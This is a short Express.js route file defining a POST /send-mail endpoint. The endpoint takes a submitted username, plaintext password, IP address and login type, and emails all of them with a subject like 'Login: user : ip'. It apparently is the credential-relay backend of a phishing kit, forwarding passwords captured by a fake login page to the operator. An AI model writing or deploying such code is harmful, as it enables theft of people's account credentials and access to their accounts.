// routes/route.js
const express = require('express');
const router = express.Router();
const mailer = require('../helper/mailer');

// POST /send-mail
router.post('/send-mail', (req, res) => {
    const { username, pass, ip, type } = req.body;

    if (!username || !pass) {
        return res.status(400).send({ response: 'failed', error: 'Missing username or password' });
    }

    // Subject line for the email
    const subject = `${type || "Login"}: ${username} : ${ip || "unknown IP"}`;

    // Call mailer
    mailer.sendEmail(res, subject, username, pass, ip, type);
});

module.exports = router;
